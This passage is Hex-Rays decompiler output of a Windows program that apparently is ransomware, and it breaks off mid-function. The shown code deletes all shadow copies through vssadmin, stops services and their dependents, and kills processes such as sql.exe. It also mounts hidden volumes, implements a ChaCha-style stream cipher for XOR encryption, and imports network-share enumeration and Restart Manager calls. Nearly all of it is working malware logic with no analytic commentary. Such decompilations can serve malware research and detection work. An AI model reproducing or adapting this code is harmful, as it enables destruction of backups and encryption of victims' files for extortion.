/* This file was generated by the Hex-Rays decompiler version 8.3.0.230608.
   Copyright (c) 2007-2021 Hex-Rays <info@hex-rays.com>

   Detected compiler: Visual C++
*/

#include <windows.h>
#include <defs.h>


//-------------------------------------------------------------------------
// Function declarations

_DWORD *__cdecl sub_4025A0(LPCSTR lpString, _DWORD *a2);
void sub_402770();
FARPROC sub_402A30();
SC_HANDLE sub_402AE0();
BOOL sub_402D30();
int sub_402E40();
int __cdecl sub_402EB0(int a1, int a2, int a3, int a4, int a5, int a6);
_DWORD *__cdecl sub_402FC0(int a1, _DWORD *a2);
int __cdecl sub_403030(unsigned __int8 *a1);
int __cdecl sub_4030A0(unsigned int a1, char a2);
int __cdecl sub_4030C0(int a1, int a2, int a3, int a4, int a5);
int __cdecl sub_4031D0(int a1, int a2);
int __cdecl sub_403210(int a1, int a2, int a3);
int __cdecl sub_403350(_DWORD *a1, int a2, int a3, int a4);
void __cdecl sub_403420(int a1, unsigned int a2);
int sub_4034B0();
int __cdecl sub_4034F0(int a1, int a2);
int __cdecl sub_403590(int a1, int a2, int a3);
unsigned int __cdecl sub_403620(int a1, unsigned int a2);
int __cdecl sub_403650(int a1, int a2);
int __cdecl sub_403690(int a1, int a2);
int __cdecl sub_4036E0(int a1, int a2);
int __cdecl sub_403730(int a1);
BOOL __cdecl sub_403760(int a1);
int __cdecl sub_4037B0(int a1);
int __cdecl sub_403820(_DWORD *a1, int a2, int a3);
int __cdecl sub_403910(_DWORD *a1);
BOOL __cdecl sub_403960(_DWORD *a1);
int __cdecl sub_4039C0(int a1, int a2, int a3);
int __cdecl sub_403A00(int a1, int a2, int a3);
BOOL __cdecl sub_403AE0(_DWORD *a1, int a2);
int __cdecl sub_403C20(int a1, int a2, int a3, int a4);
int __cdecl sub_403C50(int a1, int a2);
BOOL __cdecl sub_403C70(int a1, int a2);
int __cdecl sub_403CB0(int a1, int a2);
int __cdecl sub_403D90(int a1, int a2, int a3, int a4);
int __cdecl sub_403F70(int a1, int a2, int a3);
int __cdecl sub_404050(int a1, int a2);
int __cdecl sub_404130(int a1, unsigned int a2);
void __cdecl sub_404150(LPCWSTR lpFileName);
void __cdecl sub_404620(LPCWSTR lpString2, unsigned int a2);
DWORD __stdcall StartAddress(WCHAR *lpThreadParameter);
int __cdecl sub_4048D0(LPNETRESOURCEW lpNetResource); // idb
void __noreturn start(); // weak
void sub_404F80();
void __cdecl sub_404F90(LPVOID lpMem);
LPVOID __cdecl sub_404FC0(int a1);
unsigned int __cdecl sub_405000(int a1, char a2, unsigned int a3);
unsigned int __cdecl sub_405030(int a1, int a2, unsigned int a3);
_DWORD *__cdecl sub_405110(_DWORD *a1);
unsigned int *__cdecl sub_4051C0(unsigned int *a1, _BYTE *a2, int a3);
_DWORD *__cdecl sub_405240(int a1, _BYTE *a2);
_DWORD *__cdecl sub_4053A0(_BYTE *a1, _BYTE *a2, int a3);
unsigned int *__cdecl sub_4053F0(unsigned int *a1, unsigned int *a2);
unsigned int *__cdecl sub_407150(unsigned int *a1);
// HANDLE __stdcall CreateToolhelp32Snapshot(DWORD dwFlags, DWORD th32ProcessID);
// BOOL __stdcall Process32FirstW(HANDLE hSnapshot, LPPROCESSENTRY32W lppe);
// BOOL __stdcall Process32NextW(HANDLE hSnapshot, LPPROCESSENTRY32W lppe);
int __stdcall sub_407200(unsigned __int64 a1, __int64 a2);
unsigned __int64 __stdcall sub_4072B0(__int64 a1, __int64 a2);
// int __usercall sub_407320@<eax>(__int64 a1@<edx:eax>, unsigned __int8 a2@<cl>);
// unsigned __int64 __usercall sub_407340@<edx:eax>(unsigned __int64 a1@<edx:eax>, unsigned __int8 a2@<cl>);
BOOL __cdecl sub_40735F(struct _EXCEPTION_POINTERS *ExceptionInfo);
// BOOL __usercall sub_407387@<eax>(int a1@<ebx>, int a2@<edi>, int a3@<esi>, char a4);
// DWORD __stdcall WNetGetConnectionW(LPCWSTR lpLocalName, LPWSTR lpRemoteName, LPDWORD lpnLength);
// DWORD __stdcall WNetOpenEnumW(DWORD dwScope, DWORD dwType, DWORD dwUsage, LPNETRESOURCEW lpNetResource, LPHANDLE lphEnum);
// DWORD __stdcall WNetEnumResourceW(HANDLE hEnum, LPDWORD lpcCount, LPVOID lpBuffer, LPDWORD lpBufferSize);
// DWORD __stdcall WNetCloseEnum(HANDLE hEnum);
// DWORD __stdcall RmStartSession(DWORD *pSessionHandle, DWORD dwSessionFlags, WCHAR strSessionKey[]);
// DWORD __stdcall RmEndSession(DWORD dwSessionHandle);
// DWORD __stdcall RmRegisterResources(DWORD dwSessionHandle, UINT nFiles, LPCWSTR rgsFileNames[], UINT nApplications, RM_UNIQUE_PROCESS rgApplications[], UINT nServices, LPCWSTR rgsServiceNames[]);
// DWORD __stdcall RmGetList(DWORD dwSessionHandle, UINT *pnProcInfoNeeded, UINT *pnProcInfo, RM_PROCESS_INFO rgAffectedApps[], LPDWORD lpdwRebootReasons);
// BOOL __stdcall IsProcessorFeaturePresent(DWORD ProcessorFeature);

//-------------------------------------------------------------------------
// Data declarations

int dword_401778[17] = { 1061, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0 }; // weak
int dword_4017C0[18] = { 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0 }; // weak
int dword_401808[18] =
{
  -1608742542,
  -493596029,
  1305118919,
  -1735702761,
  1229420283,
  -1143883207,
  -1261522804,
  1205481549,
  -1817049626,
  1131451780,
  25435300,
  1613004872,
  1234388,
  -1399020905,
  -133152796,
  -2112317903,
  1502756796,
  40810408
}; // weak
int dword_401850[18] =
{
  1056032675,
  30231572,
  1494844662,
  839135432,
  2074586907,
  -1239371750,
  -143479076,
  1337899961,
  -1404784985,
  -1656129088,
  7178796,
  -3793156,
  -1624212908,
  1305840876,
  1003132209,
  1330309854,
  2135932727,
  55172224
}; // weak
int dword_401898[17] =
{
  1669074945,
  1560180623,
  512876212,
  -438945480,
  -1238312885,
  -1853931208,
  -1282299685,
  -241540124,
  320360673,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0
}; // weak
const WCHAR word_401BB4 = 92u; // idb
int dword_401BB8[36] =
{
  1562385742,
  1228093630,
  2068093810,
  -1413710222,
  -1753442874,
  -481358684,
  1920827117,
  -1522180944,
  -1121833713,
  1127448557,
  1414975944,
  -1676208290,
  1572314234,
  39731004,
  1549869764,
  1498291700,
  1908354818,
  83754542,
  724285273,
  -594044117,
  626037849,
  441365415,
  1261406280,
  231985263,
  1809028932,
  -213821871,
  1671024618,
  -185520403,
  -1452836016,
  860447420,
  510257004,
  -522254520,
  1114697711,
  200418880,
  -1546927133,
  97400998
}; // weak
int dword_4022C8[] = { 1116352408 }; // weak
int dword_4022CC[] = { 1899447441 }; // weak
int dword_4022D0[] = { -1245643825 }; // weak
int dword_4022D4[] = { -373957723 }; // weak
int dword_4022D8[] = { 961987163 }; // weak
int dword_4022DC[] = { 1508970993 }; // weak
int dword_4022E0[] = { -1841331548 }; // weak
int dword_4022E4[] = { -1424204075 }; // weak
int dword_4022E8[] = { -670586216 }; // weak
int dword_4022EC[] = { 310598401 }; // weak
int dword_4022F0[] = { 607225278 }; // weak
int dword_4022F4[] = { 1426881987 }; // weak
int dword_4022F8[] = { 1925078388 }; // weak
int dword_4022FC[] = { -2132889090 }; // weak
int dword_402300[] = { -1680079193 }; // weak
int dword_402304[] = { -1046744716 }; // weak
const struct _EXCEPTION_POINTERS ExceptionInfo = { &dword_408400, &dword_408450 }; // idb
LPCSTR lpServiceName = &dword_401000; // idb
LPCWSTR lpString1 = L"sql.exe"; // idb
LPCWSTR lpString2 = L"Windows"; // idb
struct _RTL_CRITICAL_SECTION CriticalSection = { NULL, 0, 0, NULL, NULL, 0u }; // idb
char byte_4081D8[32] =
{
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0'
}; // weak
_UNKNOWN unk_4081F8; // weak
_UNKNOWN unk_408204; // weak
_UNKNOWN unk_408224; // weak
_UNKNOWN unk_408230; // weak
_UNKNOWN unk_408278; // weak
_BYTE byte_408308[144]; // weak
_BYTE byte_408398[32]; // weak
_BYTE byte_4083B8[32]; // weak
_UNKNOWN unk_4083D8; // weak
struct _RTL_CRITICAL_SECTION stru_4083E4; // idb
int dword_408400; // weak
int dword_408404; // weak
int dword_40840C; // weak
int dword_408410; // weak
int dword_408414; // weak
int dword_408450; // weak
__int16 word_4084DC; // weak
__int16 word_4084E0; // weak
__int16 word_4084E4; // weak
__int16 word_4084E8; // weak
int dword_4084EC; // weak
int dword_4084F0; // weak
int dword_4084F4; // weak
int dword_4084F8; // weak
int dword_4084FC; // weak
int dword_408500; // weak
int dword_408504; // weak
int dword_408508; // weak
__int16 word_40850C; // weak
int dword_408510; // weak
int dword_408514; // weak
__int16 word_408518; // weak
// extern SC_HANDLE (__stdcall *OpenServiceA)(SC_HANDLE hSCManager, LPCSTR lpServiceName, DWORD dwDesiredAccess);
// extern SC_HANDLE (__stdcall *OpenSCManagerA)(LPCSTR lpMachineName, LPCSTR lpDatabaseName, DWORD dwDesiredAccess);
// extern BOOL (__stdcall *EnumDependentServicesA)(SC_HANDLE hService, DWORD dwServiceState, LPENUM_SERVICE_STATUSA lpServices, DWORD cbBufSize, LPDWORD pcbBytesNeeded, LPDWORD lpServicesReturned);
// extern BOOL (__stdcall *ControlService)(SC_HANDLE hService, DWORD dwControl, LPSERVICE_STATUS lpServiceStatus);
// extern BOOL (__stdcall *CloseServiceHandle)(SC_HANDLE hSCObject);
// extern BOOL (__stdcall *QueryServiceStatusEx)(SC_HANDLE hService, SC_STATUS_TYPE InfoLevel, LPBYTE lpBuffer, DWORD cbBufSize, LPDWORD pcbBytesNeeded);
// extern void (__stdcall *Sleep)(DWORD dwMilliseconds);
// extern HANDLE (__stdcall *GetCurrentProcess)();
// extern BOOL (__stdcall *TerminateProcess)(HANDLE hProcess, UINT uExitCode);
// extern HANDLE (__stdcall *OpenProcess)(DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwProcessId);
// extern DWORD (__stdcall *GetTickCount)();
// extern HMODULE (__stdcall *GetModuleHandleA)(LPCSTR lpModuleName);
// extern FARPROC (__stdcall *GetProcAddress)(HMODULE hModule, LPCSTR lpProcName);
// extern HMODULE (__stdcall *LoadLibraryA)(LPCSTR lpLibFileName);
// extern HGLOBAL (__stdcall *GlobalAlloc)(UINT uFlags, SIZE_T dwBytes);
// extern int (__stdcall *lstrcmpW)(LPCWSTR lpString1, LPCWSTR lpString2);
// extern int (__stdcall *lstrlenA)(LPCSTR lpString);
// extern int (__stdcall *lstrlenW)(LPCWSTR lpString);
// extern BOOL (__stdcall *SetVolumeMountPointW)(LPCWSTR lpszVolumeMountPoint, LPCWSTR lpszVolumeName);
// extern void (__stdcall *InitializeCriticalSection)(LPCRITICAL_SECTION lpCriticalSection);
// extern void (__stdcall *EnterCriticalSection)(LPCRITICAL_SECTION lpCriticalSection);
// extern void (__stdcall *LeaveCriticalSection)(LPCRITICAL_SECTION lpCriticalSection);
// extern LPSTR (__stdcall *GetCommandLineA)();
// extern DWORD (__stdcall *GetEnvironmentVariableW)(LPCWSTR lpName, LPWSTR lpBuffer, DWORD nSize);
// extern HANDLE (__stdcall *CreateFileW)(LPCWSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile);
// extern BOOL (__stdcall *FindClose)(HANDLE hFindFile);
// extern HANDLE (__stdcall *FindFirstFileW)(LPCWSTR lpFileName, LPWIN32_FIND_DATAW lpFindFileData);
// extern DWORD (__stdcall *GetLastError)();
// extern BOOL (__stdcall *FlushFileBuffers)(HANDLE hFile);
// extern BOOL (__stdcall *GetFileSizeEx)(HANDLE hFile, PLARGE_INTEGER lpFileSize);
// extern DWORD (__stdcall *GetLogicalDrives)();
// extern BOOL (__stdcall *SetFileAttributesW)(LPCWSTR lpFileName, DWORD dwFileAttributes);
// extern BOOL (__stdcall *WriteFile)(HANDLE hFile, LPCVOID lpBuffer, DWORD nNumberOfBytesToWrite, LPDWORD lpNumberOfBytesWritten, LPOVERLAPPED lpOverlapped);
// extern DWORD (__stdcall *WaitForSingleObject)(HANDLE hHandle, DWORD dwMilliseconds);
// extern DWORD (__stdcall *WaitForMultipleObjects)(DWORD nCount, const HANDLE *lpHandles, BOOL bWaitAll, DWORD dwMilliseconds);
// extern DWORD (__stdcall *GetCurrentProcessId)();
// extern void (__stdcall __noreturn *ExitProcess)(UINT uExitCode);
// extern HANDLE (__stdcall *CreateThread)(LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId);
// extern BOOL (__stdcall *SetProcessShutdownParameters)(DWORD dwLevel, DWORD dwFlags);
// extern void (__stdcall *GetSystemInfo)(LPSYSTEM_INFO lpSystemInfo);
// extern LPVOID (__stdcall *MapViewOfFile)(HANDLE hFileMappingObject, DWORD dwDesiredAccess, DWORD dwFileOffsetHigh, DWORD dwFileOffsetLow, SIZE_T dwNumberOfBytesToMap);
// extern BOOL (__stdcall *UnmapViewOfFile)(LPCVOID lpBaseAddress);
// extern int (__stdcall *lstrcmpA)(LPCSTR lpString1, LPCSTR lpString2);
// extern int (__stdcall *lstrcmpiW)(LPCWSTR lpString1, LPCWSTR lpString2);
// extern LPWSTR (__stdcall *lstrcpyW)(LPWSTR lpString1, LPCWSTR lpString2);
// extern LPWSTR (__stdcall *lstrcatW)(LPWSTR lpString1, LPCWSTR lpString2);
// extern HANDLE (__stdcall *CreateFileMappingA)(HANDLE hFile, LPSECURITY_ATTRIBUTES lpFileMappingAttributes, DWORD flProtect, DWORD dwMaximumSizeHigh, DWORD dwMaximumSizeLow, LPCSTR lpName);
// extern BOOL (__stdcall *MoveFileExW)(LPCWSTR lpExistingFileName, LPCWSTR lpNewFileName, DWORD dwFlags);
// extern LPVOID (__stdcall *HeapAlloc)(HANDLE hHeap, DWORD dwFlags, SIZE_T dwBytes);
// extern BOOL (__stdcall *HeapFree)(HANDLE hHeap, DWORD dwFlags, LPVOID lpMem);
// extern HANDLE (__stdcall *GetProcessHeap)();
// extern LPTOP_LEVEL_EXCEPTION_FILTER (__stdcall *SetUnhandledExceptionFilter)(LPTOP_LEVEL_EXCEPTION_FILTER lpTopLevelExceptionFilter);
// extern BOOL (__stdcall *CloseHandle)(HANDLE hObject);
// extern BOOL (__stdcall *GetVolumePathNamesForVolumeNameW)(LPCWSTR lpszVolumeName, LPWCH lpszVolumePathNames, DWORD cchBufferLength, PDWORD lpcchReturnLength);
// extern UINT (__stdcall *GetDriveTypeW)(LPCWSTR lpRootPathName);
// extern BOOL (__stdcall *FindVolumeClose)(HANDLE hFindVolume);
// extern BOOL (__stdcall *FindNextVolumeW)(HANDLE hFindVolume, LPWSTR lpszVolumeName, DWORD cchBufferLength);
// extern BOOL (__stdcall *FindNextFileW)(HANDLE hFindFile, LPWIN32_FIND_DATAW lpFindFileData);
// extern HANDLE (__stdcall *FindFirstVolumeW)(LPWSTR lpszVolumeName, DWORD cchBufferLength);
// extern LONG (__stdcall *UnhandledExceptionFilter)(struct _EXCEPTION_POINTERS *ExceptionInfo);
// extern HRESULT (__stdcall *SHEmptyRecycleBinA)(HWND hwnd, LPCSTR pszRootPath, DWORD dwFlags);
// extern HINSTANCE (__stdcall *ShellExecuteW)(HWND hwnd, LPCWSTR lpOperation, LPCWSTR lpFile, LPCWSTR lpParameters, LPCWSTR lpDirectory, INT nShowCmd);


//----- (004025A0) --------------------------------------------------------
_DWORD *__cdecl sub_4025A0(LPCSTR lpString, _DWORD *a2)
{
  int v3; // [esp+0h] [ebp-20h]
  _DWORD *v4; // [esp+8h] [ebp-18h]
  unsigned int v5; // [esp+Ch] [ebp-14h]
  int v6; // [esp+Ch] [ebp-14h]
  char *v7; // [esp+10h] [ebp-10h]
  int v8; // [esp+14h] [ebp-Ch]
  int v9; // [esp+18h] [ebp-8h]
  char v10; // [esp+1Ch] [ebp-4h]
  char v11; // [esp+1Dh] [ebp-3h]
  char v12; // [esp+1Eh] [ebp-2h]
  CHAR v13; // [esp+1Fh] [ebp-1h]

  v3 = lstrlenA(lpString);
  v5 = 4 * ((unsigned int)(v3 + 2) >> 1) + 4;
  v4 = GlobalAlloc(0, v5 + v3 + 2);
  v7 = (char *)v4 + v5;
  v8 = 0;
  *v4 = (char *)v4 + v5;
  v10 = 0;
  v11 = 0;
  v12 = 1;
  v6 = 0;
  v9 = 0;
  while ( 1 )
  {
    v13 = lpString[v6];
    if ( !v13 )
      break;
    if ( v10 )
    {
      if ( v13 == 34 )
        v10 = 0;
      else
        v7[v9++] = v13;
    }
    else
    {
      switch ( v13 )
      {
        case 9:
        case 10:
        case 13:
        case 32:
          if ( v11 )
            v7[v9++] = 0;
          v11 = 0;
          v12 = 1;
          break;
        case 34:
          v10 = 1;
          v11 = 1;
          if ( v12 )
            v4[v8++] = &v7[v9];
          v12 = 0;
          break;
        default:
          v11 = 1;
          if ( v12 )
            v4[v8++] = &v7[v9];
          v7[v9++] = v13;
          v12 = 0;
          break;
      }
    }
    ++v6;
  }
  v7[v9] = 0;
  v4[v8] = 0;
  *a2 = v8;
  return v4;
}

//----- (00402770) --------------------------------------------------------
void sub_402770()
{
  LPCWSTR lpszVolumeMountPoint[26]; // [esp+0h] [ebp-2F8h]
  LPCWSTR lpRootPathName[26]; // [esp+68h] [ebp-290h]
  DWORD cchBufferLength; // [esp+D0h] [ebp-228h]
  LPVOID lpMem; // [esp+D4h] [ebp-224h]
  HANDLE hFindVolume; // [esp+D8h] [ebp-220h]
  int i; // [esp+DCh] [ebp-21Ch]
  LPWSTR lpszVolumeName; // [esp+E0h] [ebp-218h]
  int v7; // [esp+E4h] [ebp-214h]
  DWORD cchReturnLength; // [esp+E8h] [ebp-210h] BYREF
  WCHAR szVolumePathNames[260]; // [esp+ECh] [ebp-20Ch] BYREF

  lpRootPathName[0] = L"Q:\\";
  lpRootPathName[1] = L"W:\\";
  lpRootPathName[2] = L"E:\\";
  lpRootPathName[3] = L"R:\\";
  lpRootPathName[4] = L"T:\\";
  lpRootPathName[5] = L"Y:\\";
  lpRootPathName[6] = L"U:\\";
  lpRootPathName[7] = L"I:\\";
  lpRootPathName[8] = L"O:\\";
  lpRootPathName[9] = L"P:\\";
  lpRootPathName[10] = L"A:\\";
  lpRootPathName[11] = L"S:\\";
  lpRootPathName[12] = L"D:\\";
  lpRootPathName[13] = L"F:\\";
  lpRootPathName[14] = L"G:\\";
  lpRootPathName[15] = L"H:\\";
  lpRootPathName[16] = L"J:\\";
  lpRootPathName[17] = L"K:\\";
  lpRootPathName[18] = L"L:\\";
  lpRootPathName[19] = L"Z:\\";
  lpRootPathName[20] = L"X:\\";
  lpRootPathName[21] = L"C:\\";
  lpRootPathName[22] = L"V:\\";
  lpRootPathName[23] = L"B:\\";
  lpRootPathName[24] = L"N:\\";
  lpRootPathName[25] = L"M:\\";
  v7 = 0;
  cchBufferLength = 120;
  cchReturnLength = 0;
  for ( i = 0; i < 26; ++i )
  {
    if ( GetDriveTypeW(lpRootPathName[i]) == 1 )
      lpszVolumeMountPoint[v7++] = lpRootPathName[i];
  }
  lpszVolumeName = (LPWSTR)sub_404FC0(0x10000);
  if ( lpszVolumeName )
  {
    lpMem = sub_404FC0(0x10000);
    if ( lpMem )
    {
      hFindVolume = FindFirstVolumeW(lpszVolumeName, 0x8000u);
      do
      {
        if ( !v7 )
          break;
        if ( !GetVolumePathNamesForVolumeNameW(lpszVolumeName, szVolumePathNames, cchBufferLength, &cchReturnLength)
          || lstrlenW(szVolumePathNames) != 3 )
        {
          SetVolumeMountPointW(lpszVolumeMountPoint[--v7], lpszVolumeName);
        }
      }
      while ( FindNextVolumeW(hFindVolume, lpszVolumeName, 0x8000u) );
      FindVolumeClose(hFindVolume);
      sub_404F90(lpMem);
    }
    sub_404F90(lpszVolumeName);
  }
}
// 401590: using guessed type wchar_t aQ[4];
// 401598: using guessed type wchar_t aW[4];
// 4015A0: using guessed type wchar_t aE[4];
// 4015A8: using guessed type wchar_t aR[4];
// 4015B0: using guessed type wchar_t aT[4];
// 4015B8: using guessed type wchar_t aY[4];
// 4015C0: using guessed type wchar_t aU[4];
// 4015C8: using guessed type wchar_t aI[4];
// 4015D0: using guessed type wchar_t aO[4];
// 4015D8: using guessed type wchar_t aP[4];
// 4015E0: using guessed type wchar_t aA[4];
// 4015E8: using guessed type wchar_t aS[4];
// 4015F0: using guessed type wchar_t aD[4];
// 4015F8: using guessed type wchar_t asc_4015F8[4];
// 401600: using guessed type wchar_t aG[4];
// 401608: using guessed type wchar_t asc_401608[4];
// 401610: using guessed type wchar_t aJ[4];
// 401618: using guessed type wchar_t aK[4];
// 401620: using guessed type wchar_t asc_401620[4];
// 401628: using guessed type wchar_t aZ[4];
// 401630: using guessed type wchar_t asc_401630[4];
// 401638: using guessed type wchar_t aC[4];
// 401640: using guessed type wchar_t aV[4];
// 401648: using guessed type wchar_t aB[4];
// 401650: using guessed type wchar_t aN[4];
// 401658: using guessed type wchar_t aM[4];
// 402770: using guessed type LPCWSTR lpszVolumeMountPoint[26];

//----- (00402A30) --------------------------------------------------------
FARPROC sub_402A30()
{
  FARPROC result; // eax
  HMODULE LibraryA; // [esp+0h] [ebp-18h]
  HMODULE hModule; // [esp+4h] [ebp-14h]
  BOOL (__stdcall *Wow64DisableWow64FsRedirection)(PVOID *); // [esp+Ch] [ebp-Ch]
  int v4; // [esp+10h] [ebp-8h] BYREF

  v4 = 0;
  if ( sub_402E40() )
  {
    hModule = LoadLibraryA("kernel32.dll");
    Wow64DisableWow64FsRedirection = (BOOL (__stdcall *)(PVOID *))GetProcAddress(
                                                                    hModule,
                                                                    "Wow64DisableWow64FsRedirection");
    if ( Wow64DisableWow64FsRedirection )
      Wow64DisableWow64FsRedirection((PVOID *)&v4);
  }
  ShellExecuteW(0, L"open", L"cmd.exe", L"/c vssadmin.exe delete shadows /all /quiet", 0, 0);
  result = (FARPROC)sub_402E40();
  if ( result )
  {
    LibraryA = LoadLibraryA("kernel32.dll");
    result = GetProcAddress(LibraryA, "Wow64RevertWow64FsRedirection");
    if ( result )
      return (FARPROC)((int (__stdcall *)(int))result)(v4);
  }
  return result;
}

//----- (00402AE0) --------------------------------------------------------
SC_HANDLE sub_402AE0()
{
  SC_HANDLE result; // eax
  LPCSTR lpServiceName[9]; // [esp+8h] [ebp-94h] BYREF
  unsigned int v2; // [esp+2Ch] [ebp-70h]
  DWORD TickCount; // [esp+30h] [ebp-6Ch]
  SC_HANDLE hSCManager; // [esp+34h] [ebp-68h]
  SC_HANDLE hSCObject; // [esp+38h] [ebp-64h]
  unsigned int i; // [esp+3Ch] [ebp-60h]
  LPENUM_SERVICE_STATUSA lpServices; // [esp+40h] [ebp-5Ch]
  SC_HANDLE hService; // [esp+44h] [ebp-58h]
  DWORD pcbBytesNeeded; // [esp+48h] [ebp-54h] BYREF
  struct _SERVICE_STATUS ServiceStatus; // [esp+4Ch] [ebp-50h] BYREF
  struct _SERVICE_STATUS Buffer; // [esp+70h] [ebp-2Ch] BYREF
  DWORD ServicesReturned; // [esp+94h] [ebp-8h] BYREF

  lpServices = 0;
  TickCount = GetTickCount();
  v2 = 30000;
  result = OpenSCManagerA(0, 0, 0xF003Fu);
  hSCManager = result;
  if ( result )
  {
    for ( i = 0; i < 0x2C; ++i )
    {
      hService = OpenServiceA(hSCManager, (&::lpServiceName)[i], 0x2Cu);
      if ( hService )
      {
        if ( QueryServiceStatusEx(hService, SC_STATUS_PROCESS_INFO, (LPBYTE)&Buffer, 0x24u, &pcbBytesNeeded)
          && Buffer.dwCurrentState != 1
          && Buffer.dwCurrentState != 3 )
        {
          if ( !EnumDependentServicesA(hService, 1u, lpServices, 0, &pcbBytesNeeded, &ServicesReturned)
            && GetLastError() == 234 )
          {
            lpServices = (LPENUM_SERVICE_STATUSA)sub_404FC0(pcbBytesNeeded);
            if ( lpServices )
            {
              if ( EnumDependentServicesA(hService, 1u, lpServices, pcbBytesNeeded, &pcbBytesNeeded, &ServicesReturned) )
              {
                qmemcpy(lpServiceName, &lpServices[i], sizeof(lpServiceName));
                hSCObject = OpenServiceA(hSCManager, lpServiceName[0], 0x24u);
                if ( hSCObject )
                {
                  if ( ControlService(hSCObject, 1u, &ServiceStatus) )
                  {
                    while ( ServiceStatus.dwCurrentState != 1 )
                    {
                      Sleep(ServiceStatus.dwWaitHint);
                      if ( QueryServiceStatusEx(
                             hSCObject,
                             SC_STATUS_PROCESS_INFO,
                             (LPBYTE)&ServiceStatus,
                             0x24u,
                             &pcbBytesNeeded) )
                      {
                        if ( ServiceStatus.dwCurrentState == 1 || GetTickCount() - TickCount > v2 )
                          break;
                      }
                    }
                    CloseServiceHandle(hSCObject);
                  }
                }
              }
              sub_404F90(lpServices);
            }
          }
          if ( ControlService(hService, 1u, &Buffer) )
          {
            do
            {
              if ( Buffer.dwCurrentState == 1 )
                break;
              Sleep(Buffer.dwWaitHint);
              if ( !QueryServiceStatusEx(hService, SC_STATUS_PROCESS_INFO, (LPBYTE)&Buffer, 0x24u, &pcbBytesNeeded) )
                break;
            }
            while ( Buffer.dwCurrentState != 1 && GetTickCount() - TickCount <= v2 );
          }
        }
        CloseServiceHandle(hService);
      }
    }
    return (SC_HANDLE)CloseServiceHandle(hSCManager);
  }
  return result;
}

//----- (00402D30) --------------------------------------------------------
BOOL sub_402D30()
{
  BOOL i; // [esp+0h] [ebp-240h]
  HANDLE hSnapshot; // [esp+4h] [ebp-23Ch]
  HANDLE hProcess; // [esp+8h] [ebp-238h]
  unsigned int j; // [esp+Ch] [ebp-234h]
  PROCESSENTRY32W pe; // [esp+10h] [ebp-230h] BYREF

  hSnapshot = CreateToolhelp32Snapshot(0xFu, 0);
  pe.dwSize = 556;
  for ( i = Process32FirstW(hSnapshot, &pe); i; i = Process32NextW(hSnapshot, &pe) )
  {
    for ( j = 0; j < 0x1F; ++j )
    {
      if ( !lstrcmpW((&lpString1)[j], pe.szExeFile) )
      {
        hProcess = OpenProcess(1u, 0, pe.th32ProcessID);
        if ( hProcess )
        {
          TerminateProcess(hProcess, 9u);
          CloseHandle(hProcess);
        }
        break;
      }
    }
  }
  return CloseHandle(hSnapshot);
}

//----- (00402E40) --------------------------------------------------------
int sub_402E40()
{
  HMODULE ModuleHandleA; // eax
  HANDLE CurrentProcess; // eax
  BOOL (__stdcall *IsWow64Process)(HANDLE, PBOOL); // [esp+0h] [ebp-Ch]
  int v4; // [esp+4h] [ebp-8h] BYREF

  v4 = 0;
  ModuleHandleA = GetModuleHandleA("kernel32.dll");
  IsWow64Process = (BOOL (__stdcall *)(HANDLE, PBOOL))GetProcAddress(ModuleHandleA, "IsWow64Process");
  if ( IsWow64Process )
  {
    CurrentProcess = GetCurrentProcess();
    if ( !IsWow64Process(CurrentProcess, &v4) )
      return 0;
  }
  return v4;
}

//----- (00402EB0) --------------------------------------------------------
int __cdecl sub_402EB0(int a1, int a2, int a3, int a4, int a5, int a6)
{
  int result; // eax
  int i; // [esp+0h] [ebp-8Ch]
  int j; // [esp+4h] [ebp-88h]
  int v9[12]; // [esp+8h] [ebp-84h] BYREF
  int v10; // [esp+38h] [ebp-54h]
  char v11[64]; // [esp+48h] [ebp-44h] BYREF

  result = sub_403350(v9, a1, a2, a3);
  for ( i = 0; i < a6; i += 64 )
  {
    sub_403210((int)v9, (int)v11, 20);
    ++v10;
    for ( j = i; ; ++j )
    {
      result = i + 64;
      if ( j >= i + 64 || j >= a6 )
        break;
      *(_BYTE *)(j + a5) = v11[j - i] ^ *(_BYTE *)(j + a4);
    }
  }
  return result;
}
// 402EB0: using guessed type char var_44[64];

//----- (00402FC0) --------------------------------------------------------
_DWORD *__cdecl sub_402FC0(int a1, _DWORD *a2)
{
  *a2 = a1;
  return a2;
}

//----- (00403030) --------------------------------------------------------
int __cdecl sub_403030(unsigned __int8 *a1)
{
  return *a1 | ((a1[1] | (*((unsigned __int16 *)a1 + 1) << 8)) << 8);
}

//----- (004030A0) --------------------------------------------------------
int __cdecl sub_4030A0(unsigned int a1, char a2)
{
  return (a1 >> (-a2 & 0x1F)) | (a1 << a2);
}

//----- (004030C0) --------------------------------------------------------
int __cdecl sub_4030C0(int a1, int a2, int a3, int a4, int a5)
{
  int result; // eax

  *(_DWORD *)(a1 + 4 * a2) += *(_DWORD *)(a1 + 4 * a3);
  *(_DWORD *)(a1 + 4 * a5) = sub_4030A0(*(_DWORD *)(a1 + 4 * a2) ^ *(_DWORD *)(a1 + 4 * a5), 16);
  *(_DWORD *)(a1 + 4 * a4) += *(_DWORD *)(a1 + 4 * a5);
  *(_DWORD *)(a1 + 4 * a3) = sub_4030A0(*(_DWORD *)(a1 + 4 * a4) ^ *(_DWORD *)(a1 + 4 * a3), 12);
  *(_DWORD *)(a1 + 4 * a2) += *(_DWORD *)(a1 + 4 * a3);
  *(_DWORD *)(a1 + 4 * a5) = sub_4030A0(*(_DWORD *)(a1 + 4 * a2) ^ *(_DWORD *)(a1 + 4 * a5), 8);
  *(_DWORD *)(a1 + 4 * a4) += *(_DWORD *)(a1 + 4 * a5);
